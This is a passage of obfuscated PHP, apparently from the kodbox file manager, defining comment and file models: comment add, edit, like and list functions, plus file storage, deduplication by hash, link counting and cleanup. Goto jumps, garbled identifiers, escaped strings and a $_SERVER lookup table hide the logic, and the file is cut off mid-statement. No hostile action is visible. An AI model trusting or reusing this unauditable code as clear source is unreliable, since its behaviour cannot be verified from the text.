<?php
 goto D—¹Ùå; E”§¨—«ÎÖ: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\155\145\x6e\x74"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\x6d\x65" => "\143\x6f\x6d\155\x65\x6e\x74\137\155\145\164\x61", "\x6d\145\164\141\x46\151\145\154\x64" => "\x63\157\x6d\x6d\145\x6e\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($DÛåÓç‰”) { $B¡™¬§·—è =& $_SERVER[Ä¿Ş°¨]; if ($DÛåÓç‰”[$B¡™¬§·—è[2090]]) { $B¬ø§Ùô† = $this->where(array($B¡™¬§·—è[2091] => $DÛåÓç‰”[$B¡™¬§·—è[2090]]))->find(); if (!$B¬ø§Ùô† || $B¬ø§Ùô†[$B¡™¬§·—è[376]] != $DÛåÓç‰”[$B¡™¬§·—è[376]] || $B¬ø§Ùô†[$B¡™¬§·—è[460]] != $DÛåÓç‰”[$B¡™¬§·—è[460]]) { return !1; } $this->where(array($B¡™¬§·—è[2091] => $DÛåÓç‰”[$B¡™¬§·—è[2090]]))->setAdd($B¡™¬§·—è[2092], 1); } return $this->add($DÛåÓç‰”); } public function remove($bíŸ«ÉĞ‘í) { $a’‚£åÛ“½ =& $_SERVER[Ä¿Ş°¨]; $FÅÙªæŸóÚ = array($a’‚£åÛ“½[2091] => $bíŸ«ÉĞ‘í); $fÉ»ÑÏŸ¿• = $this->where($FÅÙªæŸóÚ)->find(); if ($fÉ»ÑÏŸ¿•[$a’‚£åÛ“½[2090]]) { $this->where(array($a’‚£åÛ“½[2091] => $fÉ»ÑÏŸ¿•[$a’‚£åÛ“½[2090]]))->setAdd($a’‚£åÛ“½[2092], -1); } return $this->where($FÅÙªæŸóÚ)->delete(); } public function edit($a›ø‹²ö„, $fõê ¦Ì¤«) { $a–Àˆ£Û‹ =& $_SERVER[Ä¿Ş°¨]; $D·¾ê–±¥ = array($a–Àˆ£Û‹[2091] => $a›ø‹²ö„); return $this->where($D·¾ê–±¥)->save(array($a–Àˆ£Û‹[2093] => $fõê ¦Ì¤«)); } public function prasise($AíÔ®èä¨ó) { $F–ŒßÆšµõ =& $_SERVER[Ä¿Ş°¨]; $FÖÄèçÖ = Model($F–ŒßÆšµõ[2094]); $a¶‹£ˆÆè = array($F–ŒßÆšµõ[2091] => $AíÔ®èä¨ó, $F–ŒßÆšµõ[1390] => USER_ID); $B÷˜ØÙáºá = $FÖÄèçÖ->where($a¶‹£ˆÆè)->find(); if (!$B÷˜ØÙáºá) { $FÖÄèçÖ->add($a¶‹£ˆÆè); $C«Õˆ—¶âÃ = $this->where(array($F–ŒßÆšµõ[2091] => $AíÔ®èä¨ó))->setAdd($F–ŒßÆšµõ[2095], 1); } else { $FÖÄèçÖ->where($a¶‹£ˆÆè)->delete(); $C«Õˆ—¶âÃ = $this->where(array($F–ŒßÆšµõ[2091] => $AíÔ®èä¨ó))->setAdd($F–ŒßÆšµõ[2095], -1); } return $C«Õˆ—¶âÃ; } public function targetInfo($eš¬ï¨‚‘, $fİ…‰²¾É) { goto cÆ´„­ƒ; cİÍ‡“—µ: return $AóªÂÙªø; goto C³Ş¢ƒÙ¶; cÆ´„­ƒ: $eßŸ‚ÌÖ†â =& $_SERVER[Ä¿Ş°¨]; $e ‘‡÷„¦œ = array($eßŸ‚ÌÖ†â[525] => $eš¬ï¨‚‘, $eßŸ‚ÌÖ†â[526] => $fİ…‰²¾É); $cƒ×Õôİš± = $this->where($e ‘‡÷„¦œ)->count(); goto c¦Ôáå éï; c¦Ôáå éï: $aõ˜·ÜÌì÷ = "\122\x49\x47\x48\x54\40\112\x4f\111\x4e\40{$this->tablePrefix}\143\x6f\155\x6d\145\x6e\164\x5f\x70\162\141\151\x73\145\x20\x73\x74\x61\162\x20\x6f\x6e\40\x63\x6f\155\x6d\145\156\x74\56\x63\157\155\x6d\x65\156\164\x49\104\40\75\x20\163\x74\x61\162\x2e\143\x6f\155\x6d\x65\x6e\x74\x49\x44"; $bø“Ş°º×§ = $this->alias($eßŸ‚ÌÖ†â[337])->where($e ‘‡÷„¦œ)->join($aõ˜·ÜÌì÷, $eßŸ‚ÌÖ†â[2096])->count(); $AóªÂÙªø = array($eßŸ‚ÌÖ†â[2097] => $cƒ×Õôİš±, $eßŸ‚ÌÖ†â[2098] => $bø“Ş°º×§); goto cİÍ‡“—µ; C³Ş¢ƒÙ¶: } public function listData($Cğˆâñï¹ğ) { $bÒ¥Ä›¢ÜÇ =& $_SERVER[Ä¿Ş°¨]; if (isset($Cğˆâñï¹ğ[$bÒ¥Ä›¢ÜÇ[2099]])) { if ($Cğˆâñï¹ğ[$bÒ¥Ä›¢ÜÇ[2099]]) { $Cğˆâñï¹ğ[$bÒ¥Ä›¢ÜÇ[2100]] = array($bÒ¥Ä›¢ÜÇ[915], intval($Cğˆâñï¹ğ[$bÒ¥Ä›¢ÜÇ[2099]])); } unset($Cğˆâñï¹ğ[$bÒ¥Ä›¢ÜÇ[2099]]); } if (isset($Cğˆâñï¹ğ[$bÒ¥Ä›¢ÜÇ[2101]])) { if ($Cğˆâñï¹ğ[$bÒ¥Ä›¢ÜÇ[2101]]) { $Cğˆâñï¹ğ[$bÒ¥Ä›¢ÜÇ[2100]] = array($bÒ¥Ä›¢ÜÇ[912], intval($Cğˆâñï¹ğ[$bÒ¥Ä›¢ÜÇ[2101]])); } unset($Cğˆâñï¹ğ[$bÒ¥Ä›¢ÜÇ[2101]]); } return $this->_listData($Cğˆâñï¹ğ); } private function _listData($eğšğÒà«Á) { $fÖÃ’É¿Ú´ =& $_SERVER[Ä¿Ş°¨]; $AéÉ™¢Ôª¨ = $this->where($eğšğÒà«Á)->_makeOrder()->selectPage(100); $this->_listAppendParent($AéÉ™¢Ôª¨[$fÖÃ’É¿Ú´[350]]); $this->_listAppendUser($AéÉ™¢Ôª¨[$fÖÃ’É¿Ú´[350]]); $this->_listAppendMeta($AéÉ™¢Ôª¨[$fÖÃ’É¿Ú´[350]]); return $AéÉ™¢Ôª¨; } private function _makeOrder() { $FÈãÉ…ßºŒ =& $_SERVER[Ä¿Ş°¨]; $Aä—„Ü«à– = array($FÈãÉ…ßºŒ[2095], $FÈãÉ…ßºŒ[2092], $FÈãÉ…ßºŒ[183]); $cõÓ–Æ°‘ô = Input::get($FÈãÉ…ßºŒ[411], $FÈãÉ…ßºŒ[7], $FÈãÉ…ßºŒ[394], $Aä—„Ü«à–); $Dï¸‡¢†¹Ü = Input::get($FÈãÉ…ßºŒ[412], $FÈãÉ…ßºŒ[7], $FÈãÉ…ßºŒ[1392], array($FÈãÉ…ßºŒ[2102], $FÈãÉ…ßºŒ[409])); $B»–ùæ±Œá = $cõÓ–Æ°‘ô . $FÈãÉ…ßºŒ[50] . $Dï¸‡¢†¹Ü; return $this->order($B»–ùæ±Œá); } private function _listAppendParent(&$Eİõ‘„Ûƒ½) { goto Fªåº·ÑŸˆ; e©åäæïÌ×: foreach ($Eİõ‘„Ûƒ½ as &$aµ «•Ë˜Ü) { if (isset($Có“Ë—‰[$aµ «•Ë˜Ü[$E›…¦˜Ô¬[2090]]])) { $aµ «•Ë˜Ü[$E›…¦˜Ô¬[2103]] = $Có“Ë—‰[$aµ «•Ë˜Ü[$E›…¦˜Ô¬[2090]]]; } } goto DÊªÚÅô„; Fªåº·ÑŸˆ: $E›…¦˜Ô¬ =& $_SERVER[Ä¿Ş°¨]; $A¬øêçè = array_unique(array_to_keyvalue($Eİõ‘„Ûƒ½, $E›…¦˜Ô¬[33], $E›…¦˜Ô¬[2090])); $A¬øêçè = array_remove_value($A¬øêçè, $E›…¦˜Ô¬[472]); goto bï‹Ş•ÛéÃ; bï‹Ş•ÛéÃ: if (!$A¬øêçè) { return; } $Có“Ë—‰ = $this->where(array($E›…¦˜Ô¬[2091] => array($E›…¦˜Ô¬[7], $A¬øêçè)))->select(); $Có“Ë—‰ = array_to_keyvalue($Có“Ë—‰, $E›…¦˜Ô¬[2100]); goto e©åäæïÌ×; DÊªÚÅô„: } private function _listAppendUser(&$a©´ø­·Ù) { goto c³åªç‡±­; e¯Íé•Í: if (count($c‚µèÁ…®) == 0) { return; } foreach ($a©´ø­·Ù as $AªİêµÈØ¤) { if (isset($AªİêµÈØ¤[$aÑ¸ø†Ê”[2103]])) { $c‚µèÁ…®[] = $AªİêµÈØ¤[$aÑ¸ø†Ê”[2103]][$aÑ¸ø†Ê”[1399]]; } } $eˆ¤óçµƒ = Model($aÑ¸ø†Ê”[481])->userListInfo($c‚µèÁ…®); goto BÁØ‰£ñÛ; BÁØ‰£ñÛ: foreach ($a©´ø­·Ù as &$AªİêµÈØ¤) { $AªİêµÈØ¤[$aÑ¸ø†Ê”[539]] = $eˆ¤óçµƒ[$AªİêµÈØ¤[$aÑ¸ø†Ê”[1399]]]; if (isset($AªİêµÈØ¤[$aÑ¸ø†Ê”[2103]])) { $AªİêµÈØ¤[$aÑ¸ø†Ê”[2103]][$aÑ¸ø†Ê”[539]] = $eˆ¤óçµƒ[$AªİêµÈØ¤[$aÑ¸ø†Ê”[2103]][$aÑ¸ø†Ê”[1399]]]; } } goto AÓšñŒ™°Ÿ; c³åªç‡±­: $aÑ¸ø†Ê” =& $_SERVER[Ä¿Ş°¨]; $c‚µèÁ…® = array_unique(array_to_keyvalue($a©´ø­·Ù, $aÑ¸ø†Ê”[33], $aÑ¸ø†Ê”[1399])); $c‚µèÁ…® = array_remove_value($c‚µèÁ…®, $aÑ¸ø†Ê”[472]); goto e¯Íé•Í; AÓšñŒ™°Ÿ: } private function _listAppendMeta(&$Dç°Ú‹Áê„) { goto b¢ìäñÓ©å; b¢ìäñÓ©å: $B°†§¾Œ£Ê =& $_SERVER[Ä¿Ş°¨]; $fİàİ¢´‚˜ = array_unique(array_to_keyvalue($Dç°Ú‹Áê„, $B°†§¾Œ£Ê[33], $B°†§¾Œ£Ê[2100])); $fİàİ¢´‚˜ = array_remove_value($fİàİ¢´‚˜, $B°†§¾Œ£Ê[472]); goto C¨»¯ˆœ´ï; C¨»¯ˆœ´ï: if (!$fİàİ¢´‚˜) { return; } foreach ($Dç°Ú‹Áê„ as $B÷»¼£Ò—) { if (isset($B÷»¼£Ò—[$B°†§¾Œ£Ê[2103]])) { $fİàİ¢´‚˜[] = $B÷»¼£Ò—[$B°†§¾Œ£Ê[2103]][$B°†§¾Œ£Ê[2100]]; } } $Fä¬£ÒÛ› = $this->metaList($fİàİ¢´‚˜); goto fí•ÎßÀ‹Ò; fí•ÎßÀ‹Ò: if (!$Fä¬£ÒÛ›) { return !1; } foreach ($Dç°Ú‹Áê„ as &$B÷»¼£Ò—) { $B÷»¼£Ò—[$B°†§¾Œ£Ê[421]] = $Fä¬£ÒÛ›[$B÷»¼£Ò—[$B°†§¾Œ£Ê[2100]]]; if (isset($B÷»¼£Ò—[$B°†§¾Œ£Ê[2103]])) { $B÷»¼£Ò—[$B°†§¾Œ£Ê[2103]][$B°†§¾Œ£Ê[421]] = $Fä¬£ÒÛ›[$B÷»¼£Ò—[$B°†§¾Œ£Ê[2103]][$B°†§¾Œ£Ê[2100]]]; } } goto aÛù™ò¬ğã; aÛù™ò¬ğã: } private function metaList($F‡ÒÅ“»‡á) { goto F„à“±·ÊØ; B¤´Î‘›ô„: return $bÂ±®à½¡© ? $bÂ±®à½¡© : array(); goto DŸÎê‰š°; CÅå«ÀêÛÛ: $bÂ±®à½¡© = Model($CÅ‡˜äùí²[2104])->where($FÇÕˆ²½”µ)->select(); $bÂ±®à½¡© = array_to_keyvalue_group($bÂ±®à½¡©, $CÅ‡˜äùí²[2100]); foreach ($bÂ±®à½¡© as $EÖÔó†¤” => $fÆãŠğ‘) { $FâİØìÁ´í = array(); foreach ($fÆãŠğ‘ as $f‹ªòÑÙ–) { $FâİØìÁ´í[$f‹ªòÑÙ–[$CÅ‡˜äùí²[89]]] = $f‹ªòÑÙ–[$CÅ‡˜äùí²[355]]; } $bÂ±®à½¡©[$EÖÔó†¤”] = $FâİØìÁ´í; } goto B¤´Î‘›ô„; F„à“±·ÊØ: $CÅ‡˜äùí² =& $_SERVER[Ä¿Ş°¨]; if (!$F‡ÒÅ“»‡á) { return array(); } $FÇÕˆ²½”µ = array($CÅ‡˜äùí²[2100] => array($CÅ‡˜äùí²[7], $F‡ÒÅ“»‡á)); goto CÅå«ÀêÛÛ; DŸÎê‰š°: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\x69\x6c\145"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\x61\155\x65" => "\x69\x6f\137\146\x69\x6c\145\x5f\155\145\x74\141", "\155\x65\x74\141\106\151\x65\x6c\144" => "\x66\151\x6c\x65\111\x44"); public function fileInfo($bæë–†·Ôí) { $C‡ÄšäÁŒ× =& $_SERVER[Ä¿Ş°¨]; static $aÒï°ÜÇ”ø = array(); if (!isset($aÒï°ÜÇ”ø[$bæë–†·Ôí])) { $bÒ—‘ªì¶ = $C‡ÄšäÁŒ×[2105]; $F²¤±éùå = Model($C‡ÄšäÁŒ×[426])->field($bÒ—‘ªì¶)->where(array($C‡ÄšäÁŒ×[424] => $bæë–†·Ôí))->find(); $aÒï°ÜÇ”ø[$bæë–†·Ôí] = $F²¤±éùå; } return $aÒï°ÜÇ”ø[$bæë–†·Ôí]; } public function addFileByContent($EÚÔõÔ¤ï× = '', $E·ÇÈğ†¬Ş = '') { goto b‹”—š—ï; BÏ©éÃòÚ: if (file_exists($b–®Æ°§—)) { @unlink($b–®Æ°§—); } return $bÄÇàç‡Àİ; goto FÖ´øÇåÃø; b‹”—š—ï: $A‹öĞŸÄ´¶ =& $_SERVER[Ä¿Ş°¨]; $A›ÃÛ±°Œ® = TEMP_PATH . $A‹öĞŸÄ´¶[2106]; if (!is_dir($A›ÃÛ±°Œ®)) { mk_dir($A›ÃÛ±°Œ®); } goto Eµ”’ê¥½®; Eµ”’ê¥½®: $b–®Æ°§— = $A›ÃÛ±°Œ® . $A‹öĞŸÄ´¶[2107] . rand_string(16); file_put_contents($b–®Æ°§—, $EÚÔõÔ¤ï×); $bÄÇàç‡Àİ = $this->addFile($b–®Æ°§—, $E·ÇÈğ†¬Ş, !0); goto BÏ©éÃòÚ; FÖ´øÇåÃø: } public function createFileName($Bê‚ŞäŠ×) { goto F£ª½¬‚¬; F£ª½¬‚¬: $Cˆ™÷²Ò¼‡ =& $_SERVER[Ä¿Ş°¨]; $açäÌçÙïˆ = IO::init($Cˆ™÷²Ò¼‡[8]); $F¡‡ò®ÕÜí = $this->makeFilePath($Bê‚ŞäŠ×, $açäÌçÙïˆ); goto e«œ»Œ²öë; e«œ»Œ²öë: $D„º¾Õùò± = $açäÌçÙïˆ->pathFather($F¡‡ò®ÕÜí); static $eÕ»å»™¡® = false; $E“¿…Íí = $Cˆ™÷²Ò¼‡[2108] . md5($D„º¾Õùò±); goto bÀ¬‹«‰ëƒ; bÀ¬‹«‰ëƒ: if (!$eÕ»å»™¡® && !Cache::get($E“¿…Íí)) { $eÕ»å»™¡® = !0; $AóğÜôíÂ = IO::mkdir($D„º¾Õùò±); if (!IO::exist($AóğÜôíÂ . $Cˆ™÷²Ò¼‡[2109])) { IO::mkfile($AóğÜôíÂ . $Cˆ™÷²Ò¼‡[2109]); } Cache::set($E“¿…Íí, 1, 3600 * 2); } return $F¡‡ò®ÕÜí; goto còÕ‹ÀõÖé; còÕ‹ÀõÖé: } public function makeFilePath($A¯ŞÎ·ÓÏ£, $BŠÜñ¬Œö¥) { goto E…Ş¶èË»°; bçÈéãòƒù: $Cæ™’ˆÍËˆ = $Bá‡Æªê—Æ . rand_string(5) . short_id(100); $A¯ŞÎ·ÓÏ£ = str_replace($CŸ’ø†£İš[8], $CŸ’ø†£İš[70], KodIO::clear($A¯ŞÎ·ÓÏ£)); if (!$A¯ŞÎ·ÓÏ£) { $e¢”¨àŒÂÁ = $CŸ’ø†£İš[2112]; } goto f“·‡—äÌ•; E…Ş¶èË»°: $CŸ’ø†£İš =& $_SERVER[Ä¿Ş°¨]; $e¢”¨àŒÂÁ = Model($CŸ’ø†£İš[1073])->get($CŸ’ø†£İš[2110]); $Bá‡Æªê—Æ = KodIO::defaultIO() . date($CŸ’ø†£İš[2111]); goto bçÈéãòƒù; f“·‡—äÌ•: switch ($e¢”¨àŒÂÁ) { case $CŸ’ø†£İš[2113]: $Cæ™’ˆÍËˆ = $Cæ™’ˆÍËˆ . $CŸ’ø†£İš[91] . $BŠÜñ¬Œö¥->ext($A¯ŞÎ·ÓÏ£); if ($BŠÜñ¬Œö¥->ext($A¯ŞÎ·ÓÏ£) == $CŸ’ø†£İš[2053]) { $Cæ™’ˆÍËˆ .= $CŸ’ø†£İš[2114]; } break; case $CŸ’ø†£İš[2115]: goto d¼‡ø«¤õ¯; cê¸İª‹ç•: break; goto f¯½‹Œ‰‘ì; d¼‡ø«¤õ¯: $F´À¤ŸÆ = Model($CŸ’ø†£İš[1073])->get($CŸ’ø†£İš[1297]); $C‡–Ë¨Óñ = substr(md5($CŸ’ø†£İš[1873] . $F´À¤ŸÆ . date($CŸ’ø†£İš[681])), 0, 8); $Bá‡Æªê—Æ = KodIO::defaultIO() . date($CŸ’ø†£İš[2116]) . $C‡–Ë¨Óñ . $CŸ’ø†£İš[8]; goto CÒÒòÂ®; CÒÒòÂ®: if ($BŠÜñ¬Œö¥->ext($A¯ŞÎ·ÓÏ£) == $CŸ’ø†£İš[2053]) { $A¯ŞÎ·ÓÏ£ .= $CŸ’ø†£İš[2114]; } $Cóù¢æœ® = IO::fileNameAuto($Bá‡Æªê—Æ, $A¯ŞÎ·ÓÏ£); $Cæ™’ˆÍËˆ = $Bá‡Æªê—Æ . $Cóù¢æœ®; goto cê¸İª‹ç•; f¯½‹Œ‰‘ì: case $CŸ’ø†£İš[2112]: break; default: break; } return $Cæ™’ˆÍËˆ; goto eŒª²²ù†à; eŒª²²ù†à: } public function addFileByRemote($c•¹±ƒš¦³, $b½ËŞà‹òÒ, $Cç¤Ù¹Åç£ = array()) { goto fá†¸òØœø; AİÈ‚ñãá†: $B¼ƒîĞ´å = IO::hashMd5($c•¹±ƒš¦³, $aî£É—Ñå‡); $Bø—æòß¶® = KodIO::defaultDriver(); $CŠÔÙ°¾Şğ = array($B»”è¹ƒ¡¾[524] => IO::size($c•¹±ƒš¦³), $B»”è¹ƒ¡¾[2117] => 1, $B»”è¹ƒ¡¾[391] => $b½ËŞà‹òÒ, $B»”è¹ƒ¡¾[729] => $Bø—æòß¶®[$B»”è¹ƒ¡¾[372]], $B»”è¹ƒ¡¾[392] => $c•¹±ƒš¦³, $B»”è¹ƒ¡¾[2118] => $Cç¤Ù¹Åç£[$B»”è¹ƒ¡¾[160]] ? $Cç¤Ù¹Åç£[$B»”è¹ƒ¡¾[160]] : IO::hashSimple($c•¹±ƒš¦³), $B»”è¹ƒ¡¾[2119] => $B¼ƒîĞ´å ? $B¼ƒîĞ´å : $aî£É—Ñå‡); goto aâ„áø˜Ê; aâ„áø˜Ê: if ($CÃïè¾ùğ¹ = $this->addFileCheckExist($CŠÔÙ°¾Şğ[$B»”è¹ƒ¡¾[160]], $CŠÔÙ°¾Şğ[$B»”è¹ƒ¡¾[159]], $CŠÔÙ°¾Şğ[$B»”è¹ƒ¡¾[77]])) { return $CÃïè¾ùğ¹; } return $this->addFileData($CŠÔÙ°¾Şğ); goto côãªò¦¸; fá†¸òØœø: $B»”è¹ƒ¡¾ =& $_SERVER[Ä¿Ş°¨]; if (!IO::exist($c•¹±ƒš¦³)) { return !1; } $aî£É—Ñå‡ = $Cç¤Ù¹Åç£[$B»”è¹ƒ¡¾[159]] ? $Cç¤Ù¹Åç£[$B»”è¹ƒ¡¾[159]] : $B»”è¹ƒ¡¾[33]; goto AİÈ‚ñãá†; côãªò¦¸: } private function addFileData($b½ˆÍ¾èŠñ) { $A˜à×ÍÆ˜ =& $_SERVER[Ä¿Ş°¨]; if (!$b½ˆÍ¾èŠñ) { return !1; } $b½ˆÍ¾èŠñ[$A˜à×ÍÆ˜[77]] = intval($b½ˆÍ¾èŠñ[$A˜à×ÍÆ˜[77]]); if (!$b½ˆÍ¾èŠñ[$A˜à×ÍÆ˜[77]] && strlen($b½ˆÍ¾èŠñ[$A˜à×ÍÆ˜[160]]) > 32) { $b½ˆÍ¾èŠñ[$A˜à×ÍÆ˜[77]] = intval(substr($b½ˆÍ¾èŠñ[$A˜à×ÍÆ˜[160]], 32)); } $E—§ªÀ„È† = $this->add($b½ˆÍ¾èŠñ); return $this->find($E—§ªÀ„È†); } public function addFile($dÒ„´õ”ùÃ, $CË¤Ë¢‰«Ä, $FÑ¹¸‹ª¼Ê = false) { $CÊ²ºù¤” = IO::hashSimple($dÒ„´õ”ùÃ); $BĞÌÒ¸ÀŠ = IO::hashMd5($dÒ„´õ”ùÃ); $cº­¼¤¦² = IO::size($dÒ„´õ”ùÃ); if ($CğÔ‘Š¶‹† = $this->addFileCheckExist($CÊ²ºù¤”, $BĞÌÒ¸ÀŠ, $cº­¼¤¦²)) { return $CğÔ‘Š¶‹†; } $B¹®…åè´Ï = $this->addFileMake($dÒ„´õ”ùÃ, $cº­¼¤¦², $CÊ²ºù¤”, $BĞÌÒ¸ÀŠ, $CË¤Ë¢‰«Ä, $FÑ¹¸‹ª¼Ê); return $this->addFileData($B¹®…åè´Ï); } public function addFileMake($E÷ÈŒ†Œ, $b›¶Û ©, $EÃÍ‡ŒÛî², $B‘ííî¸áŠ, $DÖ¹ÚËà›, $F½¦ôÁøœ¬) { goto BÒ°ø‹ÙÖ; BÒ°ø‹ÙÖ: $eøé®•¨” =& $_SERVER[Ä¿Ş°¨]; $B¨Áë”æÕ = $this->createFileName($DÖ¹ÚËà›); $A·Û¾™êĞƒ = get_path_father($B¨Áë”æÕ); goto bšìÎºÛäÊ; bšìÎºÛäÊ: $bÀùĞ¦¬ = get_path_this($B¨Áë”æÕ); if ($F½¦ôÁøœ¬) { $d—¯’ë‡ì‘ = IO::move($E÷ÈŒ†Œ, $A·Û¾™êĞƒ, !1, $bÀùĞ¦¬); } else { $d—¯’ë‡ì‘ = IO::copy($E÷ÈŒ†Œ, $A·Û¾™êĞƒ, !1, $bÀùĞ¦¬); } if (!$d—¯’ë‡ì‘) { return !1; } goto e´ÚŸ¥Ÿ»Ó; e´ÚŸ¥Ÿ»Ó: $EµÎËğ•ªí = KodIO::defaultDriver(); $e®ÖÒ£ªÒ = array($eøé®•¨”[524] => $b›¶Û ©, $eøé®•¨”[2117] => 1, $eøé®•¨”[391] => $DÖ¹ÚËà›, $eøé®•¨”[729] => $EµÎËğ•ªí[$eøé®•¨”[372]], $eøé®•¨”[392] => $B¨Áë”æÕ, $eøé®•¨”[2118] => $EÃÍ‡ŒÛî², $eøé®•¨”[2119] => $B‘ííî¸áŠ); return $e®ÖÒ£ªÒ; goto FŠ«¬“¶‚±; FŠ«¬“¶‚±: } public function addFileCheckExist($A¹ä¤øæÇ, $E”´¬™ã”Ê, $EŸµ–¨„öç) { $D’ÄÂÁùö¶ =& $_SERVER[Ä¿Ş°¨]; $C‚ªö§™»¹ = $this->findByHash($A¹ä¤øæÇ, $E”´¬™ã”Ê); if (!$C‚ªö§™»¹) { return !1; } $FÕŒ¸ôÍ¡¯ = array($D’ÄÂÁùö¶[2117] => intval($C‚ªö§™»¹[$D’ÄÂÁùö¶[2120]]) + 1, $D’ÄÂÁùö¶[524] => $EŸµ–¨„öç); $this->where(array($D’ÄÂÁùö¶[424] => $C‚ªö§™»¹[$D’ÄÂÁùö¶[423]]))->save($FÕŒ¸ôÍ¡¯); return $C‚ªö§™»¹; } public function remove($f†Şƒô§’) { $this->linkCountChange($f†Şƒô§’, !1); $this->clearEmpty(); return !0; } public function linkAdd($CÀğò˜•¿) { $this->linkCountChange($CÀğò˜•¿, !0); } public function linkCountChange($c½©Î¹İ¬Ç, $BÖ•æ¼ùâ†) { goto Dºª‚Ëª¼®; aÛ‰Ñ…á¬£: foreach ($d½ƒ‡‘‚Œª as $eèó«ƒï”ñ => $C«ù³áÄ¢Ü) { $fßã§Ş»³ = $C«ù³áÄ¢Ü . $EòÜÇä„œ[33]; if (!$Dê×‘ÖÕ—[$fßã§Ş»³]) { $Dê×‘ÖÕ—[$fßã§Ş»³] = array(); } $Dê×‘ÖÕ—[$fßã§Ş»³][] = $eèó«ƒï”ñ; } foreach ($Dê×‘ÖÕ— as $C«ù³áÄ¢Ü => $cèÙÚœ”‚) { if (!$cèÙÚœ”‚) { continue; } $C«ù³áÄ¢Ü = $BÖ•æ¼ùâ† ? $C«ù³áÄ¢Ü : -intval($C«ù³áÄ¢Ü); $cŒæ¸Ş°¡ = array($EòÜÇä„œ[423] => array($EòÜÇä„œ[7], $cèÙÚœ”‚)); if ($C«ù³áÄ¢Ü < 0) { $cŒæ¸Ş°¡[$EòÜÇä„œ[2120]] = array($EòÜÇä„œ[916], abs($C«ù³áÄ¢Ü)); } $this->where($cŒæ¸Ş°¡)->setAdd($EòÜÇä„œ[2120], $C«ù³áÄ¢Ü); } goto dùÃ’Ú¨¢„; Dºª‚Ëª¼®: $EòÜÇä„œ =& $_SERVER[Ä¿Ş°¨]; if (!$c½©Î¹İ¬Ç) { return; } if (!is_array($c½©Î¹İ¬Ç)) { $c½©Î¹İ¬Ç = array($c½©Î¹İ¬Ç); } goto e¬‰ÕÀŒ¼–; e¬‰ÕÀŒ¼–: $d½ƒ‡‘‚Œª = array(); foreach ($c½©Î¹İ¬Ç as $eèó«ƒï”ñ) { $fßã§Ş»³ = $eèó«ƒï”ñ . $EòÜÇä„œ[33]; if (!$d½ƒ‡‘‚Œª[$fßã§Ş»³]) { $d½ƒ‡‘‚Œª[$fßã§Ş»³] = 0; } $d½ƒ‡‘‚Œª[$fßã§Ş»³]++; } $Dê×‘ÖÕ— = array(); goto aÛ‰Ñ…á¬£; dùÃ’Ú¨¢„: } public function findByHash($b‚ÎÔ§‹‚õ, $FêèøªÖ = false) { $aÑ•ŠÃ¥†Œ =& $_SERVER[Ä¿Ş°¨]; if (!$b‚ÎÔ§‹‚õ && !$FêèøªÖ) { return !1; } $DÒë½‹ñÇ¼ = array($aÑ•ŠÃ¥†Œ[2118] => $b‚ÎÔ§‹‚õ); if ($FêèøªÖ) { $DÒë½‹ñÇ¼ = array($aÑ•ŠÃ¥†Œ[2119] => $FêèøªÖ); } return $this->order($aÑ•ŠÃ¥†Œ[2121])->where($DÒë½‹ñÇ¼)->find(); } public function clearEmpty($aâµƒÆğÌ¯ = 0) { goto BÊ›ˆ»Î ; BÊ›ˆ»Î : $BÖëõå‚‹ =& $_SERVER[Ä¿Ş°¨]; $aÇ»±ò÷Û = time() - 3600 * 24 * $aâµƒÆğÌ¯; $EÙ·œçàÔè = $BÖëõå‚‹[2122] . $aÇ»±ò÷Û; goto F®éÔ²‹´Î; FÊ†ç¤¼äŒ: foreach ($D®‹òéãã as $a¹áïÈ¢ß) { $aŞ©ï‡„°->update(1); $this->resetFile($a¹áïÈ¢ß); } $aŞ©ï‡„°->end(); goto eã¡È‚£‚†; F®éÔ²‹´Î: $D®‹òéãã = $this->where($EÙ·œçàÔè)->select(); if (!$D®‹òéãã) { return; } $aŞ©ï‡„° = new Task($BÖëõå‚‹[2123], $BÖëõå‚‹[33], count($D®‹òéãã)); goto FÊ†ç¤¼äŒ; eã¡È‚£‚†: } private function resetFile($eòœé†´›) { goto D Ÿî¹ô‹ß; DÌ£ø· öÒ: $e¹ãÏåõ¡ = Model($F‡Á’ìÃ[2124])->where($Eë³È°—ï¬)->count(); $F¬§†˜Ğ™ = intval($bŸäºÖÂ³í) + intval($e¹ãÏåõ¡); if ($F¬§†˜Ğ™ == 0) { IO::remove($eòœé†´›[$F‡Á’ìÃ[75]]); $this->where($Eë³È°—ï¬)->delete(); $this->metaSet($eòœé†´›[$F‡Á’ìÃ[423]], null, null); return; } goto c†¾×ĞÕœˆ; D Ÿî¹ô‹ß: $F‡Á’ìÃ =& $_SERVER[Ä¿Ş°¨]; $Eë³È°—ï¬ = array($F‡Á’ìÃ[424] => $eòœé†´›[$F‡Á’ìÃ[423]]); $bŸäºÖÂ³í = Model($F‡Á’ìÃ[1095])->where($Eë³È°—ï¬)->count(); goto DÌ£ø· öÒ; c†¾×ĞÕœˆ: if ($eòœé†´›[$F‡Á’ìÃ[2120]] != $F¬§†˜Ğ™) { $this->where($Eë³È°—ï¬)->save(array($F‡Á’ìÃ[2117] => $F¬§†˜Ğ™)); } goto bÕÏéÂ×£ô; bÕÏéÂ×£ô: } public function storageInfo($Eİ‚•…‰† = false) { goto D®Ëµ“Î¸Î; eÉİìÃä¾: $b˜×ÁôƒÖÈ = 1; $dÁãÕĞ’è› = 0; $BÉ…„²‡à = 5000; goto fÅ¡‡Î©ÓÒ; fÅ¡‡Î©ÓÒ: for ($f™Ú²«Ç¨÷ = 0; $f™Ú²«Ç¨÷ < $D´‘­²­Í; $f™Ú²«Ç¨÷ = $f™Ú²«Ç¨÷ + $BÉ…„²‡à) { $eŞõïŸÔ¶£ = $this->limit($f™Ú²«Ç¨÷, $f™Ú²«Ç¨÷ + $BÉ…„²‡à)->select(); foreach ($eŞõïŸÔ¶£ as $c÷‰õ´æÇĞ) { $b˜×ÁôƒÖÈ += $c÷‰õ´æÇĞ[$eŒÑìÅµ”ô[77]] * $c÷‰õ´æÇĞ[$eŒÑìÅµ”ô[2120]]; $aŒóõºÚ‚Õ += $c÷‰õ´æÇĞ[$eŒÑìÅµ”ô[77]] * 